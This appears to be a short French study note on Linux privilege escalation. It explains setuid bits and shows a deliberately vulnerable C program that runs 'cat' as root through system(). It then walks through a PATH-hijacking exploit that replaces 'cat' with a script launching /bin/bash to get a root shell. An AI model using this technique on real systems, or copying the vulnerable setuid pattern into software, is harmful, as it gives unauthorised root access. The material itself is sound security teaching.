# Failles

## Escalade de privilièges

### Parlons du sticky bit

* Permission de base + des rajouts
	* **Sticky bit** Permet de maintenir l'éxécutable en cache.
	* **Setuid / Setgid** Permet d'éxécuter le programme entant que l'utilisateur propriétaire.

```Bash
ls `which passwd` -l
	-rwsr-xr-x 1 root root 54256 mai 17  2017 /usr/bin/passwd
```

* Faire qu'un programme avec le setuid éxecute la commande `bash`.

### Programme cassé

```C
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(){
	setuid(0);
	system("cat /home/jean/protected/logs/day_1.txt");
	return 0;
}

```

### Lancement de `bash`

* Modification de la variable `PATH`
	* Création d'un fichier `cat`
		```Bash
		#!/bin/sh
		/bin/bash
	
		```
	* Modification du `PATH`
		```Bash
		export PATH=$HOME/exploit/
		```
	* Execution du programme
	* Et root.
	


